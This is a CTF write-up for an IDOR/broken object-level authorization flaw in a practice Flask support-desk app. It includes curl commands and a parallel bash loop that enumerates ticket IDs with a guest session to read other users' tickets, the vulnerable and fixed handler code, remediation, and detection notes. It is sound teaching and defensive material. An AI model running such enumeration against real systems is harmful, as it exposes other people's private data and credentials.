# TicketVault — HackCTF Web Challenge Write-up

**Target:** `http://10.10.0.19:5000`
**Category:** Web
**Vulnerability:** Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)
**Flag:** `HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}`
**Status:** Solved

---

## 1. Summary

TicketVault is a small Flask/Gunicorn support-desk portal. A demo account (`guest / guest`) is provided. The "Your tickets" page correctly lists only the logged-in user's tickets, which creates the impression that the data is private.

That impression is false. The ticket detail route `/ticket/<id>` performs **authentication** but no **authorization**: it looks up the ticket by its sequential numeric ID and renders it regardless of who owns it. Any authenticated user can read every other user's tickets by changing the number in the URL.

Enumerating ticket IDs exposed tickets belonging to `m.ortiz`, `it-admin`, `a.feng`, `j.park`, `security-team`, and others. Ticket `#1007` — "Re: break-glass credentials rotation", owned by `it-admin` — contained the flag.

A second, deliberately planted ticket (`#1028`, owned by `security-team`, titled "HONEYPOT -- do not submit") contained a fake flag. It was correctly identified as a decoy and not submitted.

---

## 2. Challenge Brief

> TicketVault is a small support-desk portal. We gave you a demo account — see if the "view my tickets" page is as private as it looks.

The phrasing "as private as it looks" is the hint: the *listing* page is scoped to the user, but the *detail* page almost certainly is not. This is the classic IDOR pattern where the collection endpoint is safe and the item endpoint is not.

**Credentials:** `guest / guest` (advertised on the login page itself, with a "Fill in" button).

---

## 3. Environment & Setup

| Item | Value |
|---|---|
| Target | `10.10.0.19:5000` |
| Server | `gunicorn` |
| Framework fingerprint | Flask (signed `session` cookie, Jinja templates, `Vary: Cookie`) |
| Auth | Cookie-based session, `HttpOnly`, `Path=/` |
| Session payload | `{"user":"guest"}` (base64url) |
| Working files | `/tmp/tv_cookies.txt` (cookie jar) |

Connectivity was confirmed with a simple request before any testing:

```bash
curl -s -i -m 15 http://10.10.0.19:5000/
```

Response:

```http
HTTP/1.1 302 FOUND
Server: gunicorn
Location: /login
```

The redirect confirmed the app was reachable and that `/` is gated behind authentication.

---

## 4. Phase 1 — Initial Reconnaissance

### 4.1 Enumerating the obvious entry points

Two requests were issued in parallel: one for `/login` and one for `/register`.

```bash
curl -s -m 15 http://10.10.0.19:5000/login
curl -s -i -m 15 http://10.10.0.19:5000/register
```

**`/login`** returned a full sign-in page. The important finding was not a vulnerability — it was the challenge-provided material, sitting directly in the HTML:

```html
<div class="demo-callout">
  <span>Demo account</span>
  <span class="creds">guest / guest</span>
  <button class="btn btn-sm btn-ghost" type="button" data-fill-demo>Fill in</button>
</div>
```

**`/register`** returned `404` with a themed error page:

```http
HTTP/1.1 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 1842
```

```html
<span class="eyebrow">error 404</span>
<h1 style="margin-bottom:10px">Ticket not found</h1>
<p class="muted">That ticket number is not in the vault.</p>
```

Note that even the generic 404 page is themed as "Ticket not found". This is a small but useful detail: the app deliberately uses a single 404 concept for "no such ticket", which later becomes a reliable enumeration oracle.

### 4.2 Static asset review

The only JavaScript file referenced by the login page was fetched:

```bash
curl -s -m 15 http://10.10.0.19:5000/static/js/app.js
```

```javascript
/* TicketVault · tiny UI helpers */
(function () {
  var fill = document.querySelector("[data-fill-demo]");
  if (fill) {
    fill.addEventListener("click", function () {
      var u = document.querySelector("input[name=username]");
      var p = document.querySelector("input[name=password]");
      if (u) u.value = "guest";
      if (p) p.value = "guest";
      if (p) p.focus();
    });
  }
})();
```

**Result:** no hidden endpoints, no API base URL, no client-side routing, no secrets. The frontend is a plain server-rendered Jinja app. This ruled out "look for the API in the JS bundle" as a strategy and pushed the assessment toward server-side route behavior.

### 4.3 What this phase established

- Authentication is the only gate seen so far.
- No self-registration — account creation is not an attack surface here.
- No client-side API to abuse; everything is server-rendered.
- The app is small, so route/object enumeration is cheap and likely to be productive.

---

## 5. Phase 2 — Authentication and Session Analysis

### 5.1 Logging in

```bash
curl -s -i -m 15 \
  -c /tmp/tv_cookies.txt \
  -d 'username=guest&password=guest' \
  http://10.10.0.19:5000/login
```

Response:

```http
HTTP/1.1 302 FOUND
Location: /tickets
Vary: Cookie
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QifQ.at39Uw.tV09xgRcfCK-jihoDkJtKpoA9kU; HttpOnly; Path=/
```

### 5.2 Session token inspection

The cookie has the shape of a **Flask signed session**: `base64url(payload).timestamp.signature`.

Decoding the payload:

```bash
python3 -c "import base64; s='eyJ1c2VyIjoiZ3Vlc3QifQ'; \
  print(base64.urlsafe_b64decode(s + '='*(-len(s)%4)).decode())"
```

```json
{"user":"guest"}
```

This is an important architectural observation: the only thing identifying the user is a value *inside a signed cookie*. Two possible attack paths follow:

1. **Forge the cookie** — crack or guess `SECRET_KEY`, sign `{"user":"admin"}`, become another user.
2. **Ignore the cookie's user field** — find server-side endpoints that accept an object identifier directly and do not cross-check it against the session.

### 5.3 Decision point (and why we did not chase the cookie)

Cookie forgery is a legitimate route, but it requires a weak/leaked `SECRET_KEY` and a wordlist run. Before spending time there, the cheaper and more likely-intended test is object-level authorization: the challenge explicitly points at the *ticket view*, not at the login mechanism.

We recorded the cookie format as a **fallback hypothesis** and deprioritized it. This turned out to be the right call — the intended flaw was authorization, not session integrity. The signed cookie was a red herring for this challenge (though still worth noting as an alternative path if the IDOR had been fixed).

---

## 6. Phase 3 — Mapping the Ticket Feature

```bash
curl -s -i -m 15 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/tickets
```

Key parts of the response:

```html
<span class="eyebrow"><span class="dot live-dot"></span>signed in as guest</span>
<h1 class="page-title">Your tickets</h1>
<p class="page-sub">Every support request currently filed under this account.</p>
```

```html
<div class="stat">
  <div class="k">Open tickets</div>
  <div class="v">2</div>
</div>
```

Two ticket cards were rendered:

```html
<a class="ticket-id" href="/ticket/1041">#1041</a>
<h3>Can&#39;t reset my password</h3>
```

```html
<a class="ticket-id" href="/ticket/1042">#1042</a>
<h3>Invoice PDF is blank</h3>
```

### 6.1 Observations that shaped the next step

- The listing is **server-side scoped**: only 2 tickets, both owned by `guest`. The page is "as private as it looks" — at the listing level.
- IDs are **small sequential integers** (`1041`, `1042`), not UUIDs. This is the single most important signal in the whole challenge.
- Detail URLs are adjacent to the listing (`/ticket/1041`), so the object identifier is user-controllable in the path.
- The route naming (`/tickets` vs `/ticket/<id>`) suggests a collection/item pair — the exact shape where BOLA/IDOR commonly lives.

### 6.2 The hypothesis

> The listing filters by `owner`, but `/ticket/<id>` probably does not. If true, any ID — including IDs owned by other users — will render.

This is testable with two requests: one of *our* IDs (control) and one *neighboring but not ours* (test).

---

## 7. Phase 4 — First IDOR Attempt (and the first real failure)

### 7.1 The test

A narrow sweep of IDs around the guest tickets was run:

```bash
for i in $(seq 1035 1060); do
  body=$(curl -s -m 5 -b /tmp/tv_cookies.txt \
    http://10.10.0.19:5000/ticket/$i)
  if ! echo "$body" | grep -q 'Ticket not found'; then
    title=$(echo "$body" | grep -oP '(?<=<h1 class="page-title">)[^<]+' | head -1)
    flag=$(echo "$body" | grep -oP 'HackCTF\{[^}]+\}')
    echo "$i | $title | $flag"
  fi
done
```

### 7.2 The result

```
1040 |  | 
1041 |  | 
1042 |  | 
```

Three IDs existed and were readable — but no titles and no flags. At face value this looked like a weak result.

### 7.3 What actually happened (failure analysis)

Two separate mistakes compounded here:

**Mistake A — wrong range assumption.**
The sweep assumed the interesting tickets were *adjacent* to the demo account's tickets (`1041`, `1042`). That is a natural but unjustified assumption: real support desks assign IDs across time, so a sensitive admin ticket could be anywhere in the namespace. The real flag was at `#1007` — **34 IDs below** the start of the scan. The scan range was simply too narrow.

**Mistake B — wrong HTML selector.**
The parsing regex expected the title in an element like:

```html
<h1 class="page-title">…</h1>
```

But the detail page uses a plain heading:

```html
<h1>Can&#39;t reset my password</h1>
```

So every `title` extracted was empty. The parser was written from the *listing* page's structure (`page-title` class) and reused blindly on the *detail* page. This did not cause a missed vulnerability, but it made the output look like the route returned blank pages, which reduced confidence in the result and could easily have caused a solver to abandon a working lead.

**Mistake C (process) — no immediate manual verification.**
Rather than opening one of the three IDs by hand to confirm what "success" looked like, the loop's broken output was taken at face value and the range was expanded on the assumption that parsing was fine. The correct move would have been: fetch one known-good ID, inspect the HTML, then write the extractor against real markup.

### 7.4 The useful signal hiding in the noise

Despite the parsing failure, three IDs returned `200` instead of the 404 page. Crucially, `1040` was **not** in the guest listing (the guest only owns `1041` and `1042`). So an ID the user does not own was readable. That alone was confirmation of the IDOR — the flag was just elsewhere.

This is the point where the approach changed: the question stopped being *"does IDOR exist?"* (it does) and became *"what is the full ID space, and what's in it?"*

---

## 8. Phase 5 — Pivot: Full-Range Parallel Enumeration

### 8.1 Changing the approach

The narrow, sequential, single-threaded loop was replaced with a **wide, parallel, full-range sweep**:

- Range expanded from `1035–1060` (26 IDs) to `1–1200` (1,200 IDs).
- Execution parallelized with `xargs -P 25` to keep runtime low and avoid hammering the target sequentially for minutes.
- Timeout per request reduced to 5s so dead IDs fail fast.
- Extraction fixed to read the **owner** from the detail page and the title from the plain `<h1>`, which is far more diagnostic than the flag alone.

### 8.2 The command

```bash
seq 1 1200 | xargs -P 25 -I{} sh -c '
  b=$(curl -s -m 5 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/ticket/{});
  if ! echo "$b" | grep -q "Ticket not found"; then
    o=$(echo "$b" | grep -oP "owner: [^<]+" | head -1);
    t=$(echo "$b" | grep -oP "(?<=<h1>)[^<]+" | head -1);
    f=$(echo "$b" | grep -oP "HackCTF\{[^}]+\}");
    echo "{}|$o|$t|$f";
  fi
' 2>/dev/null | sort -n
```

### 8.3 The result

```
1003|owner: m.ortiz|VPN keeps dropping|
1007|owner: it-admin|Re: break-glass credentials rotation|HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}
1009|owner: a.feng|New laptop request|
1015|owner: support-bot|Re: welcome aboard|
1023|owner: j.park|Email signature broken|
1028|owner: security-team|HONEYPOT -- do not submit|HackCTF{th1s_1s_a_d3c0y_d0nt_submit_m3}
1034|owner: l.NGUYEN|Printer on 3rd floor|
1040|owner: support-bot|Survey|
1041|owner: guest|Can't reset my password|
1042|owner: guest|Invoice PDF is blank|
```

Only ~10 of the 1,200 IDs existed, but the important thing is that nine of them were **not owned by `guest`** and were fully readable. That is complete, unambiguous broken object-level authorization.

Adding the owner field to the output was the key improvement: it turned the scan from "did this return 200?" into "whose data am I reading?", which is exactly the impact statement needed for a report — and it is what made the decoy obvious.

---

## 9. Phase 6 — Triage and Avoiding the Honeypot

The wide sweep surfaced **two** flag-shaped strings. A naive `grep -o 'HackCTF{[^}]*}'` pipeline would have emitted both, and a careless solver might have submitted the first hit.

### 9.1 The decoy

```html
<span class="ticket-id">#1028</span>
<h1>HONEYPOT -- do not submit</h1>
<span>owner: security-team</span>
...
HackCTF{th1s_1s_a_d3c0y_d0nt_submit_m3}
```

Three independent signals mark this as a trap:

1. The title literally says **"HONEYPOT -- do not submit"**.
2. The owner is `security-team`, not an admin or a real user.
3. The flag text itself reads `th1s_1s_a_d3c0y_d0nt_submit_m3` ("this is a decoy, don't submit me").

### 9.2 The real finding

```html
<span class="ticket-id">#1007</span>
<h1>Re: break-glass credentials rotation</h1>
<span>owner: it-admin</span>
...
Rotated the on-call break-glass secret this quarter. Filing it here for
the audit trail: HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}
```

The narrative fits a realistic secret-management mistake: an administrator filed a rotated privileged secret in the ticketing system "for the audit trail", assuming ticket visibility was restricted by ownership.

### 9.3 Triage rule adopted

> A flag-shaped string is not evidence of success. Validate the *object* first — owner, title, and body context — and treat any artifact that self-identifies as a decoy as hostile until proven otherwise.

This is the same discipline as avoiding a false positive in a real engagement: confirm you are reading a real, sensitive object, not a planted trap or an echo of test data.

---

## 10. Phase 7 — Verification and Evidence

### 10.1 Confirm the flag page in full

```bash
curl -s -m 10 -b /tmp/tv_cookies.txt \
  http://10.10.0.19:5000/ticket/1007 \
  | sed -n '/<main/,/<\/main>/p'
```

```html
<main class="main">
  <div class="shell">
<div class="ticket-detail">
  <a class="back-link" href="/tickets">
    <span aria-hidden="true">&larr;</span> back to your tickets
  </a>

  <div class="card">
    <div class="ticket-head">
      <span class="ticket-id">#1007</span>
      <span class="chip chip-ok"><span class="dot live-dot"></span>open</span>
    </div>

    <h1>Re: break-glass credentials rotation</h1>

    <div class="ticket-meta">
      <span>owner: it-admin</span>
      <span class="sep" aria-hidden="true">·</span>
      <span>support ticket</span>
      <span class="sep" aria-hidden="true">·</span>
      <span>via web portal</span>
    </div>

    <hr class="divider">

    <div class="ticket-body">Rotated the on-call break-glass secret this quarter. Filing it here for the audit trail: HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}</div>
  </div>
</div>
  </div>
</main>
```

### 10.2 Confirm the security controls that *do* work

To make the report precise about *what* is broken, three control checks were run:

| Check | Command | Result |
|---|---|---|
| Unauthenticated `/ticket/1007` | `curl -o /dev/null -w '%{http_code} %{redirect_url}' http://10.10.0.19:5000/ticket/1007` | `302 → /login` |
| Unauthenticated `/tickets` | same, on `/tickets` | `302 → /login` |
| Authenticated but non-existent ID | `curl -w '%{http_code}' -b jar .../ticket/9999` | `404` |

Interpretation:

- **Authentication is enforced.** Anonymous users cannot read tickets. The flaw is not "open access".
- **Not-found handling is normal.** Unknown IDs return a 404 page, which is why the presence/absence of "Ticket not found" was a clean enumeration oracle.
- **The flaw is purely horizontal authorization.** The server knows *who* you are; it just never checks *whether the object belongs to you*.

### 10.3 Control case that proves the point

Ticket `#1040` ("Survey", owner `support-bot`) returns `200` with full content to `guest`, while the `/tickets` listing for `guest` shows only `#1041` and `#1042`. Same session, same cookie — the listing is scoped, the detail is not.

---

## 11. Failure Log — What Went Wrong and How the Approach Changed

This section is deliberately explicit. The solve was not a straight line; three of the four mistakes below cost time or nearly cost correctness.

| # | Phase | Mistake | Consequence | Correction |
|---|---|---|---|---|
| 1 | Recon | Assumed a `/register` route existed because CTF apps usually have one | One wasted request; momentary dead end | Moved on immediately; treated auth surface as closed once `/register` 404'd |
| 2 | Recon | Expected client-side JS to reveal an API (a habit from SPA targets) | `app.js` had no useful data | Re-focused on server-rendered routes and object IDs |
| 3 | Enumeration | Scanned only `1035–1060` (26 IDs) around the demo account's tickets | Real flag at `#1007` was outside the window; one extra scan cycle needed | Expanded to the full `1–1200` range and parallelized it |
| 4 | Parsing | Reused the listing-page selector `h1.page-title` on the detail page | All titles extracted as empty; output looked broken and low-value | Switched to `<h1>` and added `owner:` extraction; manually verified one ID before trusting the loop |
| 5 | Triage | Might have submitted the first `HackCTF{...}` match found | Would have submitted the honeypot at `#1028` | Validated owner/title/body context; rejected the self-declared decoy |
| 6 | Evidence | First ticket reads were done ad hoc without saving raw responses | Had to re-fetch `#1007` to quote exact HTML | Re-fetched and stored the full `<main>` block for the report |

### 11.1 The two failures that mattered most

**The narrow scan (failure #3) was the expensive one.** It was caused by an implicit assumption: *"the interesting object must be near my objects."* In sequential-ID systems, that is false. IDs are allocated globally over time; a sensitive record can be anywhere. The lesson is to map the whole keyspace when enumeration is cheap, not to sample around a guess.

**The selector mismatch (failure #4) was the dangerous one.** A broken extractor can make a live vulnerability look dead. If the scan had returned only empty titles and no flags in a range that *did* contain three readable tickets, it would have been reasonable to conclude "IDOR is confirmed but nothing interesting here" and stop. The fix was to inspect one real response manually and write the parser against the actual markup.

### 11.2 Hypotheses considered and deliberately dropped

| Hypothesis | Why considered | Why dropped |
|---|---|---|
| Forge Flask session (`{"user":"admin"}`) | Cookie payload is readable and user-controllable in principle | Requires cracking `SECRET_KEY`; object-level flaw was cheaper and directly hinted at by the challenge text. Kept as fallback, never needed |
| Self-registration to get another account | Standard CTF pattern | `/register` 404 — no registration route |
| Hidden admin panel / API in JS | Standard SPA recon | `app.js` is 15 lines of demo-button logic; no routes, no API |
| Horizontal IDOR on `/ticket/<id>` | Sequential IDs, collection/item route pair, ownership metadata rendered in the page | **Correct** — confirmed via `#1040`, exploited via `#1007` |

### 11.3 What we would do differently next time

1. **Verify the response shape before writing the extractor.** Fetch one known object, read the actual HTML, then parse.
2. **Enumerate the whole numeric keyspace in one pass** when the endpoint is cheap and IDs are sequential — do not sample around a guess.
3. **Always capture the owner/tenant field** in enumeration output. It converts "200 OK" into provable unauthorized access and exposes decoys.
4. **Treat flags as artifacts, not proof.** Context (owner, title, body) decides whether an artifact is real.
5. **Record the negative controls** (unauth → 302, missing ID → 404) *before* reporting. They define the exact scope of the flaw.

---

## 12. Root Cause

The detail handler authenticates the request but does not authorize the object. Conceptually:

```python
@app.route("/ticket/<int:ticket_id>")
@login_required
def ticket_detail(ticket_id):
    ticket = db.get_ticket(ticket_id)      # fetched by client-supplied ID
    if ticket is None:
        abort(404)
    return render_template("ticket.html", ticket=ticket)
    # ^ no check that ticket.owner == session["user"]
```

The listing handler, by contrast, is correctly scoped:

```python
@app.route("/tickets")
@login_required
def tickets():
    rows = db.query("SELECT * FROM tickets WHERE owner = ?", session["user"])
    return render_template("tickets.html", tickets=rows)
```

So the application demonstrates the exact anti-pattern that produces BOLA:

- **Collection endpoint:** filters by the session's user → looks private.
- **Item endpoint:** trusts the path ID → leaks everything.

Compounding factors:

1. **Sequential, guessable identifiers.** `1041`, `1042`, … make enumeration trivial. UUIDs would not fix the authorization bug, but they raise the cost of exploitation substantially.
2. **Ownership rendered in the UI.** The page helpfully prints `owner: it-admin`, confirming to the attacker that they are reading someone else's record.
3. **Sensitive data stored in tickets.** A break-glass secret was filed as ticket content, so an authorization bug becomes a credential disclosure.

---

## 13. Impact

An authenticated low-privilege user (`guest`) can read every ticket in the system by iterating IDs. In this deployment that exposed:

- **Administrative credentials material** — the on-call break-glass secret in `#1007` (the flag).
- **Internal operational details** — VPN issues (`m.ortiz`), hardware requests (`a.feng`), email/signature problems (`j.park`), printer issues (`l.NGUYEN`).
- **Security-team artifacts** — including the honeypot ticket, which confirms the defenders anticipated this exact attack.

In a production support desk, the same bug typically exposes:

- PII (names, emails, addresses) from customer tickets.
- Password-reset links and tokens pasted into tickets.
- Internal hostnames, VPN details, and infrastructure notes.
- API keys / credentials filed "for the audit trail" — exactly as happened here.

Severity: **High**. Authentication is required (raises the bar slightly), but any self-registered or demo user reaches every tenant's data with a `for` loop, and the leaked content includes privileged secrets. This is a horizontal privilege escalation with direct credential-disclosure impact.

---

## 14. Remediation

### 14.1 Enforce object-level authorization (the actual fix)

Scope the lookup by the session's user, and return `404` (not `403`) for objects the user does not own, to avoid confirming that an ID exists:

```python
@app.route("/ticket/<int:ticket_id>")
@login_required
def ticket_detail(ticket_id):
    ticket = db.get_ticket_for_user(ticket_id, session["user"])
    if ticket is None:
        abort(404)
    return render_template("ticket.html", ticket=ticket)
```

```sql
SELECT * FROM tickets WHERE id = ? AND owner = ?;
```

Or, if staff/admin roles must see all tickets, make that an explicit, role-checked branch rather than the default:

```python
if not (ticket.owner == session["user"] or session.get("role") == "admin"):
    abort(404)
```

### 14.2 Defense in depth

- **Centralize authorization.** Use a single helper (or an ORM policy / `authorize()` call) for every object fetch, so new routes cannot forget the check. BOLA is a *systemic* bug class; per-route vigilance does not scale.
- **Prefer unguessable identifiers.** UUIDv4 or a per-user opaque key. This is not a substitute for authorization, but it removes the trivial `for i in range(...)` exploit path.
- **Keep secrets out of tickets.** Break-glass credentials belong in a secrets manager, not a support ticket body. Rotate the one that leaked (`#1007`) regardless of the code fix.
- **Log and alert on enumeration.** A single session requesting hundreds of sequential ticket IDs is not normal behavior; rate-limit and alert on 4xx/200 patterns across object IDs.
- **Harden the session cookie.** The cookie was `HttpOnly; Path=/` but lacked `Secure` and `SameSite`. Add `SameSite=Lax`/`Strict` and `Secure` under TLS to reduce CSRF and transit exposure.
- **Add regression tests.** An automated test asserting that user A receives `404` for user B's ticket would have caught this before release.

---

## 15. Detection Opportunities (Blue Team)

Signals that would have surfaced this attack in a real environment:

- Sequential or high-volume access to `/ticket/<id>` from one session (the exploit here was ~1,200 requests).
- A user session requesting object IDs it does not own — detectable by comparing requested IDs against the session's ticket list.
- Spikes in `404` rates on an object route, typical of enumeration.
- Access to admin-owned records from a low-privilege account (owner mismatch on read).

---

## 16. Methodology Takeaways

1. **"Looks private" is a claim to test, not an observation.** The listing page being scoped is exactly the setup that makes the unscoped detail page interesting.
2. **Sequential IDs plus a collection/item route pair is a standing invitation to test BOLA.** Test your own ID first (control), then an ID you do not own (test).
3. **Width beats precision in enumeration.** If IDs are cheap to probe and sequential, map the whole range — the sensitive record is rarely adjacent to yours.
4. **Parse against reality.** Read one real response before writing the extractor; a broken grep can make a live bug look dead.
5. **Triage by object, not by string.** Owner, title, and body context distinguish a real finding from a planted decoy.
6. **Confirm the negative controls.** Knowing that anonymous access is blocked and unknown IDs return 404 is what turns "I found a page" into "I proved a specific authorization flaw".

---

## 17. Timeline

| Time (relative) | Action | Outcome |
|---|---|---|
| T+0:00 | `GET /` | `302 → /login`; app reachable |
| T+0:05 | `GET /login`, `GET /register` | Login page leaks demo creds; `/register` = 404 |
| T+0:10 | `GET /static/js/app.js` | No routes/API; server-rendered app confirmed |
| T+0:15 | `POST /login` (`guest:guest`) | `302 → /tickets`; Flask session cookie captured |
| T+0:18 | Decode session payload | `{"user":"guest"}`; cookie forgery noted as fallback |
| T+0:20 | `GET /tickets` | Two tickets only: `#1041`, `#1042` (scoped listing) |
| T+0:24 | Narrow ID scan `1035–1060` | `1040`, `1041`, `1042` readable — **IDOR confirmed**, but titles empty (bad selector), no flag |
| T+0:50 | Full scan `1–1200`, parallel, owner-aware | 10 tickets found across 6+ owners; two flag-shaped strings |
| T+0:54 | Triage `#1028` vs `#1007` | `#1028` = self-declared honeypot; `#1007` = `it-admin` break-glass secret → real flag |
| T+0:58 | Re-fetch `#1007`, test negative controls | Flag quoted; unauth = 302, missing ID = 404 |
| T+1:05 | Write-up | Complete |

---

## 18. Appendix

### 18.1 Complete command list

```bash
# 1. Reachability / redirect
curl -s -i -m 15 http://10.10.0.19:5000/

# 2. Login page (leaks demo creds) and registration probe
curl -s -m 15 http://10.10.0.19:5000/login
curl -s -i -m 15 http://10.10.0.19:5000/register

# 3. Client-side asset review
curl -s -m 15 http://10.10.0.19:5000/static/js/app.js

# 4. Authenticate and store the session
curl -s -i -m 15 -c /tmp/tv_cookies.txt \
  -d 'username=guest&password=guest' http://10.10.0.19:5000/login

# 5. Decode the Flask session payload
python3 -c "import base64; s='eyJ1c2VyIjoiZ3Vlc3QifQ'; \
  print(base64.urlsafe_b64decode(s + '='*(-len(s)%4)).decode())"

# 6. Read the (correctly scoped) ticket listing
curl -s -i -m 15 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/tickets

# 7. Narrow IDOR probe (first attempt — too narrow, bad selector)
for i in $(seq 1035 1060); do
  body=$(curl -s -m 5 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/ticket/$i)
  if ! echo "$body" | grep -q 'Ticket not found'; then
    echo "$i readable"
  fi
done

# 8. Full parallel enumeration (the successful approach)
seq 1 1200 | xargs -P 25 -I{} sh -c '
  b=$(curl -s -m 5 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/ticket/{});
  if ! echo "$b" | grep -q "Ticket not found"; then
    o=$(echo "$b" | grep -oP "owner: [^<]+" | head -1);
    t=$(echo "$b" | grep -oP "(?<=<h1>)[^<]+" | head -1);
    f=$(echo "$b" | grep -oP "HackCTF\{[^}]+\}");
    echo "{}|$o|$t|$f";
  fi
' 2>/dev/null | sort -n

# 9. Confirm the flag ticket
curl -s -m 10 -b /tmp/tv_cookies.txt \
  http://10.10.0.19:5000/ticket/1007 | sed -n '/<main/,/<\/main>/p'

# 10. Negative controls
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  -m 10 http://10.10.0.19:5000/ticket/1007        # 302 /login
curl -s -o /dev/null -w '%{http_code}\n' \
  -m 10 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/ticket/9999   # 404

# 11. Rotate/confirm decoy is a decoy
curl -s -m 10 -b /tmp/tv_cookies.txt http://10.10.0.19:5000/ticket/1028
```

### 18.2 Key evidence

**Guest listing (scoped — 2 tickets):**

```
#1041  Can't reset my password   owner: guest
#1042  Invoice PDF is blank      owner: guest
```

**IDOR proof (unowned ticket readable with the guest session):**

```
#1040  Survey                    owner: support-bot   -> 200 OK
```

**Real flag:**

```
#1007  Re: break-glass credentials rotation
owner: it-admin
Rotated the on-call break-glass secret this quarter.
Filing it here for the audit trail:
HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}
```

**Decoy (do not submit):**

```
#1028  HONEYPOT -- do not submit
owner: security-team
HackCTF{th1s_1s_a_d3c0y_d0nt_submit_m3}
```

### 18.3 Flag

```
HackCTF{1d0r_l3ts_y0u_r34d_0th3r_t1ck3ts}
```
